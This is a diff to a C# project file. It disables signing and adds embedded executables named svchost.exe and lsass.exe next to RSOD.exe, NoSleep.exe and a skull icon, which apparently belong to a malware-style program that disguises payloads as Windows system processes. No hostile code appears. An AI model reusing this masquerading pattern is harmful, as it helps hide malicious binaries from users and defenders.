@@ -41,6 +41,29 @@
   <PropertyGroup>
     <ApplicationIcon>skull_real_ico.ico</ApplicationIcon>
   </PropertyGroup>
+  <PropertyGroup>
+    <SignManifests>false</SignManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestCertificateThumbprint>ABBAD803A376897CE7B7D68BCEC71D12A6B2A897</ManifestCertificateThumbprint>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestKeyFile>
+    </ManifestKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestTimestampUrl>http://timestamp.digicert.com</ManifestTimestampUrl>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignAssembly>false</SignAssembly>
+  </PropertyGroup>
+  <PropertyGroup>
+    <AssemblyOriginatorKeyFile>
+    </AssemblyOriginatorKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <DelaySign>false</DelaySign>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
@@ -152,8 +175,9 @@
     <EmbeddedResource Include="Resources\RSOD.exe" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="Resources\NoSleep.exe" />
     <EmbeddedResource Include="Resources\svchost.exe" />
+    <EmbeddedResource Include="Resources\lsass.exe" />
+    <EmbeddedResource Include="Resources\NoSleep.exe" />
     <Content Include="skull_real_ico.ico" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
